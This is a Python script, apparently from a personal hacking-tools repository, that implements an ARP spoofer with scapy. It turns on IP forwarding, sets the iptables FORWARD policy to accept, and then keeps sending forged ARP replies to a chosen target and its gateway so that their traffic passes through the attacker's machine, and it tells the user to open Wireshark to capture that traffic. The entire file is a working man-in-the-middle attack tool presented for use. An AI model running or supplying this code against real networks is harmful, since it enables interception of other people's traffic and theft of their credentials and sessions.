#!/usr/bin/env python3
import argparse, signal, os, sys, time, subprocess, re
from banners import skull_banner, arp_spoofer
import scapy.all as scapy
from termcolor import colored
from datetime import datetime

# Ctrl + c
def ctrl_c(sig, frame):
    print(colored("\n\n\t[!] Quiting...\n\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global Vars
dobliuw = colored("Dobliuw ARP Spoofer", 'red')
url = colored('https://github.com/Dobliuw/MyHackingTools', 'blue')
info = colored("[i]", 'yellow')
succes = colored("[+]", "green")
err = colored("[!]", 'red')
ip_regex = r'^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$'
mac_regex = r'^([a-fA-F0-9]{2}\:){5}([a-fA-F-0-9]{2})$'
mac_address = ""
hosts_discovered = []

# Get Actual time
def actual_time():
    now_time = str(datetime.now()).split('.')[0]
    return now_time

# Flags panel
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer ☠︎︎")
    parser.add_argument("-t", "--target", required=True, dest="target_ip", help="Host or Host range to Spoof")
    parser.add_argument("-g", "--gateway", required=True, dest="gateway", help="Default Gateway (Probably router IP)")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Network Interface")
    args = parser.parse_args()

    return args.target_ip, args.gateway, args.interface

# Start spoof network
def spoof_host(target_ip, spoof_ip, mac_address):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=mac_address) # 1 Request, 2 Response
    scapy.send(arp_packet, verbose=False)
    


# Start Program
if __name__ == "__main__":
    if os.getuid() == 0:
        target_ip, gateway_address, interface = get_arguments()
        if re.match(r'^[e][n|t][s|h]\d{1,2}$', interface):
            command = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
            now = actual_time()
            skull_banner()   
            arp_spoofer()
            print(f"Starting {dobliuw} v1.0 ( {url} ) at {now}\n") 
            try:
                subprocess.run(command, shell=True)
                subprocess.run(["iptables","--policy", "FORWARD", "ACCEPT"])
                stdout = subprocess.run(["ifconfig", interface], capture_output=True).stdout.decode()
                
                mac_address = re.search(r'(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', stdout).group(1)
                
                time.sleep(2)
                print("%s Spoofing the ARP Table for IP %s and Gateway IP (%s) with mac %s...\n\n%s You can open wireshark/tshark right now..." % (info, colored(target_ip, 'yellow'), colored(gateway_address, 'yellow'), colored(mac_address, 'yellow'), info))
                
                while True:
                    if mac_address:
                        spoof_host(target_ip, gateway_address, mac_address)
                        spoof_host(gateway_address, target_ip, mac_address)
                        time.sleep(1)
                    else:
                        print(colored("\n\n\t[!] An error ocurred with the MAC address.\n\n", "red"))

            except Exception as e:
                print(colored(e, 'red'))
                sys.exit(1)
        else:
            print(colored("\n\n\t[!] Wrong interface...", 'red'))
            sys.exit(1)
    else:
        print(colored("\n\n\t[!] You need run this script like sudo.\n\n", 'red'))
        sys.exit(1)